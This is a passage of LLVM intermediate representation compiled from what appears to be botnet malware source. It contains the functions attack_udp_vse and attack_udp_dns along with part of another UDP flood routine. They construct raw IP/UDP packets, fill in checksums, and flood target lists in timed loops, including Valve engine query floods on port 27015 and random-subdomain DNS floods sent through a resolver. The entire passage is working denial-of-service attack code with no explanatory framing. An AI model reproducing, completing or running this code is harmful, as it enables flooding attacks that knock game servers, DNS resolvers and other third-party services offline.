  store i16 %67, i16* %69, align 2
  %70 = call zeroext i16 @htons(i16 zeroext %13) #11
  %71 = getelementptr inbounds i8, i8* %63, i64 4
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 4
  %73 = getelementptr inbounds i8, i8* %63, i64 8
  store i8 %15, i8* %73, align 4
  br i1 %42, label %78, label %74

; <label>:74:                                     ; preds = %62
  %75 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %76 = getelementptr inbounds i8, i8* %63, i64 6
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 2
  br label %78

; <label>:78:                                     ; preds = %62, %74
  %79 = getelementptr inbounds i8, i8* %63, i64 9
  store i8 17, i8* %79, align 1
  %80 = getelementptr inbounds i8, i8* %63, i64 12
  %81 = bitcast i8* %80 to i32*
  store i32 %27, i32* %81, align 4
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = getelementptr inbounds i8, i8* %63, i64 16
  %85 = bitcast i8* %84 to i32*
  store i32 %83, i32* %85, align 4
  %86 = call zeroext i16 @htons(i16 zeroext %19) #11
  %87 = bitcast i8* %65 to i16*
  store i16 %86, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %21) #11
  %89 = getelementptr inbounds i8, i8* %63, i64 22
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %43) #11
  %92 = getelementptr inbounds i8, i8* %63, i64 24
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %94 = icmp slt i64 %indvars.iv.next, %44
  br i1 %94, label %62, label %..preheader_crit_edge

; <label>:95:                                     ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %95
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %130
  %storemerge8789 = phi i32 [ %151, %130 ], [ 0, %.lr.ph.preheader ]
  %96 = sext i32 %storemerge8789 to i64
  %97 = getelementptr inbounds i8*, i8** %9, i64 %96
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to %struct.iphdr*
  %100 = getelementptr inbounds i8, i8* %98, i64 20
  %101 = getelementptr inbounds i8, i8* %98, i64 28
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %96, i32 2
  %103 = load i8, i8* %102, align 4
  %104 = icmp ult i8 %103, 32
  br i1 %104, label %105, label %112

; <label>:105:                                    ; preds = %.lr.ph
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %96, i32 1
  %107 = load i32, i32* %106, align 4
  %108 = call i32 @ntohl(i32 %107) #11
  %109 = call i32 @htonl(i32 %108) #11
  %110 = getelementptr inbounds i8, i8* %98, i64 16
  %111 = bitcast i8* %110 to i32*
  store i32 %109, i32* %111, align 4
  br label %112

; <label>:112:                                    ; preds = %105, %.lr.ph
  br i1 %49, label %113, label %116

; <label>:113:                                    ; preds = %112
  %114 = getelementptr inbounds i8, i8* %98, i64 12
  %115 = bitcast i8* %114 to i32*
  store i32 0, i32* %115, align 4
  br label %116

; <label>:116:                                    ; preds = %113, %112
  br i1 %51, label %117, label %120

; <label>:117:                                    ; preds = %116
  %118 = getelementptr inbounds i8, i8* %98, i64 4
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 4
  br label %120

; <label>:120:                                    ; preds = %117, %116
  br i1 %53, label %121, label %123

; <label>:121:                                    ; preds = %120
  %122 = bitcast i8* %100 to i16*
  store i16 0, i16* %122, align 2
  br label %123

; <label>:123:                                    ; preds = %121, %120
  br i1 %55, label %124, label %127

; <label>:124:                                    ; preds = %123
  %125 = getelementptr inbounds i8, i8* %98, i64 22
  %126 = bitcast i8* %125 to i16*
  store i16 0, i16* %126, align 2
  br label %127

; <label>:127:                                    ; preds = %124, %123
  br i1 %56, label %130, label %128

; <label>:128:                                    ; preds = %127
  call void @rand_alphastr(i8* %101, i32 %61)
  %129 = getelementptr inbounds i8, i8* %101, i64 %57
  store i8 0, i8* %129, align 1
  %.pre = load i32, i32* %6, align 4
  br label %130

; <label>:130:                                    ; preds = %127, %128
  %131 = phi i32 [ %storemerge8789, %127 ], [ %.pre, %128 ]
  %132 = getelementptr inbounds i8, i8* %98, i64 10
  %133 = bitcast i8* %132 to i16*
  store i16 0, i16* %133, align 2
  %134 = bitcast i8* %98 to i16*
  %135 = call zeroext i16 @checksum_generic(i16* %134, i32 20)
  store i16 %135, i16* %133, align 2
  %136 = getelementptr inbounds i8, i8* %98, i64 26
  %137 = bitcast i8* %136 to i16*
  store i16 0, i16* %137, align 2
  %138 = getelementptr inbounds i8, i8* %98, i64 24
  %139 = bitcast i8* %138 to i16*
  %140 = load i16, i16* %139, align 2
  %141 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %99, i8* %100, i16 zeroext %140, i32 %59)
  store i16 %141, i16* %137, align 2
  %142 = getelementptr inbounds i8, i8* %98, i64 22
  %143 = bitcast i8* %142 to i16*
  %144 = load i16, i16* %143, align 2
  %145 = sext i32 %131 to i64
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %145, i32 0, i32 1
  store i16 %144, i16* %146, align 2
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %145, i32 0
  %148 = bitcast %struct.sockaddr_in* %147 to %struct.sockaddr*
  %149 = call i64 @sendto(i32 %33, i8* %98, i64 %60, i32 16384, %struct.sockaddr* %148, i32 16) #10
  %150 = load i32, i32* %6, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %6, align 4
  %152 = icmp slt i32 %151, %39
  br i1 %152, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %130
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %95
  %153 = call i64 @time(i64* null) #10
  %154 = icmp sgt i64 %153, %48
  br i1 %154, label %.loopexit.loopexit, label %95

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %45
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %8 = zext i8 %1 to i64
  %9 = tail call noalias i8* @calloc(i64 %8, i64 8) #10
  %10 = bitcast i8* %9 to i8**
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %12 = trunc i32 %11 to i8
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %14 = trunc i32 %13 to i16
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 27015)
  %22 = trunc i32 %21 to i16
  store i32 0, i32* %7, align 4
  %23 = tail call i64 @time(i64* null) #10
  %24 = zext i32 %0 to i64
  %25 = add i64 %23, %24
  tail call void @table_unlock_val(i8 zeroext 36)
  %26 = call i8* @table_retrieve_val(i32 36, i32* nonnull %7)
  %27 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %30 = bitcast i32* %6 to i8*
  %31 = call i32 @setsockopt(i32 %27, i32 0, i32 3, i8* nonnull %30, i32 4) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %36, label %.preheader73

.preheader73:                                     ; preds = %29
  store i32 0, i32* %6, align 4
  %33 = zext i8 %1 to i32
  %34 = icmp eq i8 %1, 0
  br i1 %34, label %.preheader, label %.lr.ph75

.lr.ph75:                                         ; preds = %.preheader73
  %35 = icmp eq i8 %18, 0
  br label %45

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %27) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %67
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader73
  %sext = shl i64 %25, 32
  %38 = ashr exact i64 %sext, 32
  %39 = and i32 %13, 65535
  %40 = icmp eq i32 %39, 65535
  %41 = and i32 %19, 65535
  %42 = icmp eq i32 %41, 65535
  %43 = and i32 %21, 65535
  %44 = icmp eq i32 %43, 65535
  br label %90

; <label>:45:                                     ; preds = %.lr.ph75, %67
  %46 = phi i32 [ 0, %.lr.ph75 ], [ %88, %67 ]
  %47 = call noalias i8* @calloc(i64 128, i64 1) #10
  %48 = sext i32 %46 to i64
  %49 = getelementptr inbounds i8*, i8** %10, i64 %48
  store i8* %47, i8** %49, align 8
  %50 = getelementptr inbounds i8, i8* %47, i64 20
  %51 = getelementptr inbounds i8, i8* %47, i64 28
  store i8 69, i8* %47, align 4
  %52 = getelementptr inbounds i8, i8* %47, i64 1
  store i8 %12, i8* %52, align 1
  %53 = load i32, i32* %7, align 4
  %54 = trunc i32 %53 to i16
  %55 = add i16 %54, 32
  %56 = call zeroext i16 @htons(i16 zeroext %55) #11
  %57 = getelementptr inbounds i8, i8* %47, i64 2
  %58 = bitcast i8* %57 to i16*
  store i16 %56, i16* %58, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %14) #11
  %60 = getelementptr inbounds i8, i8* %47, i64 4
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 4
  %62 = getelementptr inbounds i8, i8* %47, i64 8
  store i8 %16, i8* %62, align 4
  br i1 %35, label %67, label %63

; <label>:63:                                     ; preds = %45
  %64 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %65 = getelementptr inbounds i8, i8* %47, i64 6
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  br label %67

; <label>:67:                                     ; preds = %45, %63
  %68 = getelementptr inbounds i8, i8* %47, i64 9
  store i8 17, i8* %68, align 1
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = getelementptr inbounds i8, i8* %47, i64 12
  %71 = bitcast i8* %70 to i32*
  store i32 %69, i32* %71, align 4
  %72 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %48, i32 1
  %73 = load i32, i32* %72, align 4
  %74 = getelementptr inbounds i8, i8* %47, i64 16
  %75 = bitcast i8* %74 to i32*
  store i32 %73, i32* %75, align 4
  %76 = call zeroext i16 @htons(i16 zeroext %20) #11
  %77 = bitcast i8* %50 to i16*
  store i16 %76, i16* %77, align 2
  %78 = call zeroext i16 @htons(i16 zeroext %22) #11
  %79 = getelementptr inbounds i8, i8* %47, i64 22
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  %81 = add i16 %54, 12
  %82 = call zeroext i16 @htons(i16 zeroext %81) #11
  %83 = getelementptr inbounds i8, i8* %47, i64 24
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = bitcast i8* %51 to i32*
  store i32 -1, i32* %85, align 4
  %86 = getelementptr inbounds i8, i8* %47, i64 32
  call void @util_memcpy(i8* %86, i8* %26, i32 %53) #10
  %87 = load i32, i32* %6, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %6, align 4
  %89 = icmp slt i32 %88, %33
  br i1 %89, label %45, label %.preheader.loopexit

; <label>:90:                                     ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %90
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %118
  %91 = phi i32 [ %139, %118 ], [ 0, %.lr.ph.preheader ]
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8*, i8** %10, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  %96 = getelementptr inbounds i8, i8* %94, i64 20
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %92, i32 2
  %98 = load i8, i8* %97, align 4
  %99 = icmp ult i8 %98, 32
  br i1 %99, label %100, label %107

; <label>:100:                                    ; preds = %.lr.ph
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %92, i32 1
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @ntohl(i32 %102) #11
  %104 = call i32 @htonl(i32 %103) #11
  %105 = getelementptr inbounds i8, i8* %94, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  br label %107

; <label>:107:                                    ; preds = %100, %.lr.ph
  br i1 %40, label %108, label %111

; <label>:108:                                    ; preds = %107
  %109 = getelementptr inbounds i8, i8* %94, i64 4
  %110 = bitcast i8* %109 to i16*
  store i16 0, i16* %110, align 4
  br label %111

; <label>:111:                                    ; preds = %108, %107
  br i1 %42, label %112, label %114

; <label>:112:                                    ; preds = %111
  %113 = bitcast i8* %96 to i16*
  store i16 0, i16* %113, align 2
  br label %114

; <label>:114:                                    ; preds = %112, %111
  %115 = getelementptr inbounds i8, i8* %94, i64 22
  %116 = bitcast i8* %115 to i16*
  br i1 %44, label %117, label %._crit_edge76

._crit_edge76:                                    ; preds = %114
  %.pre = load i16, i16* %116, align 2
  br label %118

; <label>:117:                                    ; preds = %114
  store i16 0, i16* %116, align 2
  br label %118

; <label>:118:                                    ; preds = %._crit_edge76, %117
  %119 = phi i16 [ %.pre, %._crit_edge76 ], [ 0, %117 ]
  %120 = getelementptr inbounds i8, i8* %94, i64 10
  %121 = bitcast i8* %120 to i16*
  store i16 0, i16* %121, align 2
  %122 = bitcast i8* %94 to i16*
  %123 = call zeroext i16 @checksum_generic(i16* %122, i32 20)
  store i16 %123, i16* %121, align 2
  %124 = getelementptr inbounds i8, i8* %94, i64 26
  %125 = bitcast i8* %124 to i16*
  store i16 0, i16* %125, align 2
  %126 = getelementptr inbounds i8, i8* %94, i64 24
  %127 = bitcast i8* %126 to i16*
  %128 = load i16, i16* %127, align 2
  %129 = load i32, i32* %7, align 4
  %130 = add i32 %129, 12
  %131 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %95, i8* nonnull %96, i16 zeroext %128, i32 %130)
  store i16 %131, i16* %125, align 2
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %92, i32 0, i32 1
  store i16 %119, i16* %132, align 2
  %133 = sext i32 %129 to i64
  %134 = add nsw i64 %133, 32
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %92, i32 0
  %136 = bitcast %struct.sockaddr_in* %135 to %struct.sockaddr*
  %137 = call i64 @sendto(i32 %27, i8* nonnull %94, i64 %134, i32 16384, %struct.sockaddr* %136, i32 16) #10
  %138 = load i32, i32* %6, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %6, align 4
  %140 = icmp slt i32 %139, %33
  br i1 %140, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %118
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %90
  %141 = call i64 @time(i64* null) #10
  %142 = icmp sgt i64 %141, %38
  br i1 %142, label %.loopexit.loopexit, label %90

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %36
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 53)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 9, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 12)
  %25 = trunc i32 %24 to i8
  %26 = tail call i8* @attack_get_opt_str(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 8, i8* null)
  %27 = tail call fastcc i32 @get_dns_resolver()
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = icmp eq i8* %26, null
  br i1 %31, label %.loopexit, label %32

; <label>:32:                                     ; preds = %5
  %33 = tail call i32 @util_strlen(i8* nonnull %26) #10
  %34 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %.loopexit, label %36

; <label>:36:                                     ; preds = %32
  store i32 1, i32* %6, align 4
  %37 = bitcast i32* %6 to i8*
  %38 = call i32 @setsockopt(i32 %34, i32 0, i32 3, i8* nonnull %37, i32 4) #10
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %50, label %.preheader126

.preheader126:                                    ; preds = %36
  store i32 0, i32* %6, align 4
  %40 = zext i8 %1 to i32
  %41 = icmp eq i8 %1, 0
  %.pre = and i32 %24, 255
  %.pre138 = zext i32 %.pre to i64
  %.pre140 = sext i32 %33 to i64
  %.pre142 = add nuw nsw i64 %.pre138, 47
  %.pre144 = add nsw i64 %.pre142, %.pre140
  br i1 %41, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader126
  %42 = trunc i64 %.pre144 to i16
  %43 = icmp eq i8 %17, 0
  %44 = add nuw nsw i64 %.pre138, 27
  %45 = add nsw i64 %44, %.pre140
  %46 = trunc i64 %45 to i16
  %47 = add nsw i32 %33, 1
  %48 = icmp sgt i32 %33, 0
  %wide.trip.count = zext i32 %33 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %49 = icmp eq i32 %33, 1
  br label %63

; <label>:50:                                     ; preds = %36
  %51 = call i32 @close(i32 %34) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %._crit_edge134
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader126
  %sext = shl i64 %30, 32
  %52 = ashr exact i64 %sext, 32
  %53 = and i32 %12, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = and i32 %18, 65535
  %56 = icmp eq i32 %55, 65535
  %57 = and i32 %20, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = and i32 %22, 65535
  %60 = icmp eq i32 %59, 65535
  %61 = add nuw nsw i32 %.pre, 27
  %62 = add i32 %61, %33
  br label %134

; <label>:63:                                     ; preds = %.lr.ph136, %._crit_edge134
  %64 = phi i32 [ 0, %.lr.ph136 ], [ %132, %._crit_edge134 ]
  %65 = call noalias i8* @calloc(i64 600, i64 1) #10
  %66 = sext i32 %64 to i64
  %67 = getelementptr inbounds i8*, i8** %9, i64 %66
  store i8* %65, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %65, i64 20
  %69 = getelementptr inbounds i8, i8* %65, i64 28
  %70 = getelementptr inbounds i8, i8* %65, i64 40
  store i8 69, i8* %65, align 4
  %71 = getelementptr inbounds i8, i8* %65, i64 1
  store i8 %11, i8* %71, align 1
  %72 = call zeroext i16 @htons(i16 zeroext %42) #11
  %73 = getelementptr inbounds i8, i8* %65, i64 2
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  %75 = call zeroext i16 @htons(i16 zeroext %13) #11
  %76 = getelementptr inbounds i8, i8* %65, i64 4
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 4
  %78 = getelementptr inbounds i8, i8* %65, i64 8
  store i8 %15, i8* %78, align 4
  br i1 %43, label %83, label %79

; <label>:79:                                     ; preds = %63
  %80 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %81 = getelementptr inbounds i8, i8* %65, i64 6
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 2
  br label %83

; <label>:83:                                     ; preds = %63, %79
  %84 = getelementptr inbounds i8, i8* %65, i64 9
  store i8 17, i8* %84, align 1
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = getelementptr inbounds i8, i8* %65, i64 12
  %87 = bitcast i8* %86 to i32*
  store i32 %85, i32* %87, align 4
  %88 = getelementptr inbounds i8, i8* %65, i64 16
  %89 = bitcast i8* %88 to i32*
  store i32 %27, i32* %89, align 4
  %90 = call zeroext i16 @htons(i16 zeroext %19) #11
  %91 = bitcast i8* %68 to i16*
  store i16 %90, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %21) #11
  %93 = getelementptr inbounds i8, i8* %65, i64 22
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 2
  %95 = call zeroext i16 @htons(i16 zeroext %46) #11
  %96 = getelementptr inbounds i8, i8* %65, i64 24
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %23) #11
  %99 = bitcast i8* %69 to i16*
  store i16 %98, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext 256) #11
  %101 = getelementptr inbounds i8, i8* %65, i64 30
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 2
  %103 = call zeroext i16 @htons(i16 zeroext 1) #11
  %104 = getelementptr inbounds i8, i8* %65, i64 32
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %65, i64 41
  store i8 %25, i8* %70, align 1
  %107 = getelementptr inbounds i8, i8* %106, i64 %.pre138
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  call void @util_memcpy(i8* %108, i8* nonnull %26, i32 %47) #10
  br i1 %48, label %.lr.ph133.preheader, label %._crit_edge134

.lr.ph133.preheader:                              ; preds = %83
  br i1 %lcmp.mod, label %.lr.ph133.prol.loopexit.unr-lcssa, label %.lr.ph133.prol.preheader

.lr.ph133.prol.preheader:                         ; preds = %.lr.ph133.preheader
  br label %.lr.ph133.prol

.lr.ph133.prol:                                   ; preds = %.lr.ph133.prol.preheader
  %109 = load i8, i8* %26, align 1
  %110 = icmp eq i8 %109, 46
  br i1 %110, label %112, label %111

; <label>:111:                                    ; preds = %.lr.ph133.prol
  br label %114

; <label>:112:                                    ; preds = %.lr.ph133.prol
  store i8 0, i8* %107, align 1
  %113 = getelementptr inbounds i8, i8* %107, i64 1
  br label %114

; <label>:114:                                    ; preds = %112, %111
  %.1123.prol = phi i8* [ %113, %112 ], [ %107, %111 ]
  %.1.prol = phi i8 [ 0, %112 ], [ 1, %111 ]
  br label %.lr.ph133.prol.loopexit.unr-lcssa

.lr.ph133.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph133.preheader, %114
  %.1123.lcssa.unr.ph = phi i8* [ %.1123.prol, %114 ], [ undef, %.lr.ph133.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %114 ], [ undef, %.lr.ph133.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %114 ], [ 0, %.lr.ph133.preheader ]
  %.0119130.unr.ph = phi i8 [ %.1.prol, %114 ], [ 0, %.lr.ph133.preheader ]
  %.0122128.unr.ph = phi i8* [ %.1123.prol, %114 ], [ %107, %.lr.ph133.preheader ]
  br label %.lr.ph133.prol.loopexit

.lr.ph133.prol.loopexit:                          ; preds = %.lr.ph133.prol.loopexit.unr-lcssa
  br i1 %49, label %._crit_edge134.loopexit, label %.lr.ph133.preheader.new

.lr.ph133.preheader.new:                          ; preds = %.lr.ph133.prol.loopexit
  br label %.lr.ph133

.lr.ph133:                                        ; preds = %187, %.lr.ph133.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph133.preheader.new ], [ %indvars.iv.next.1, %187 ]
  %.0119130 = phi i8 [ %.0119130.unr.ph, %.lr.ph133.preheader.new ], [ %.1.1, %187 ]
  %.0122128 = phi i8* [ %.0122128.unr.ph, %.lr.ph133.preheader.new ], [ %.1123.1, %187 ]
  %115 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv
  %116 = load i8, i8* %115, align 1
  %117 = icmp eq i8 %116, 46
  br i1 %117, label %118, label %121

; <label>:118:                                    ; preds = %.lr.ph133
  store i8 %.0119130, i8* %.0122128, align 1
  %119 = getelementptr inbounds i8, i8* %107, i64 %indvars.iv
  %120 = getelementptr inbounds i8, i8* %119, i64 1
  br label %.lr.ph133.1146

; <label>:121:                                    ; preds = %.lr.ph133
  %122 = add i8 %.0119130, 1
  br label %.lr.ph133.1146

.lr.ph133.1146:                                   ; preds = %118, %121
  %.1123 = phi i8* [ %120, %118 ], [ %.0122128, %121 ]
  %.1 = phi i8 [ 0, %118 ], [ %122, %121 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %123 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv.next
  %124 = load i8, i8* %123, align 1
  %125 = icmp eq i8 %124, 46
  br i1 %125, label %184, label %182

._crit_edge134.loopexit.unr-lcssa:                ; preds = %187
  br label %._crit_edge134.loopexit

._crit_edge134.loopexit:                          ; preds = %.lr.ph133.prol.loopexit, %._crit_edge134.loopexit.unr-lcssa
  %.1123.lcssa = phi i8* [ %.1123.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1123.1, %._crit_edge134.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph133.prol.loopexit ], [ %.1.1, %._crit_edge134.loopexit.unr-lcssa ]
  br label %._crit_edge134

._crit_edge134:                                   ; preds = %._crit_edge134.loopexit, %83
  %.0122.lcssa = phi i8* [ %107, %83 ], [ %.1123.lcssa, %._crit_edge134.loopexit ]
  %.0119.lcssa = phi i8 [ 0, %83 ], [ %.1.lcssa, %._crit_edge134.loopexit ]
  store i8 %.0119.lcssa, i8* %.0122.lcssa, align 1
  %126 = getelementptr inbounds i8, i8* %107, i64 %.pre140
  %127 = getelementptr inbounds i8, i8* %126, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %103, i16* %128, align 2
  %129 = getelementptr inbounds i8, i8* %127, i64 2
  %130 = bitcast i8* %129 to i16*
  store i16 %103, i16* %130, align 2
  %131 = load i32, i32* %6, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %6, align 4
  %133 = icmp slt i32 %132, %40
  br i1 %133, label %63, label %.preheader.loopexit

; <label>:134:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %41, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %134
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %155
  %storemerge124127 = phi i32 [ %178, %155 ], [ 0, %.lr.ph.preheader ]
  %135 = sext i32 %storemerge124127 to i64
  %136 = getelementptr inbounds i8*, i8** %9, i64 %135
  %137 = load i8*, i8** %136, align 8
  %138 = bitcast i8* %137 to %struct.iphdr*
  %139 = getelementptr inbounds i8, i8* %137, i64 20
  %140 = getelementptr inbounds i8, i8* %137, i64 28
  %141 = getelementptr inbounds i8, i8* %137, i64 41
  br i1 %54, label %142, label %145

; <label>:142:                                    ; preds = %.lr.ph
  %143 = getelementptr inbounds i8, i8* %137, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %142, %.lr.ph
  br i1 %56, label %146, label %148

; <label>:146:                                    ; preds = %145
  %147 = bitcast i8* %139 to i16*
  store i16 0, i16* %147, align 2
  br label %148

; <label>:148:                                    ; preds = %146, %145
  br i1 %58, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %137, i64 22
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 2
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %60, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %140 to i16*
  store i16 0, i16* %154, align 2
  br label %155

; <label>:155:                                    ; preds = %153, %152
  call void @rand_alphastr(i8* %141, i32 %.pre)
  %156 = getelementptr inbounds i8, i8* %141, i64 %.pre138
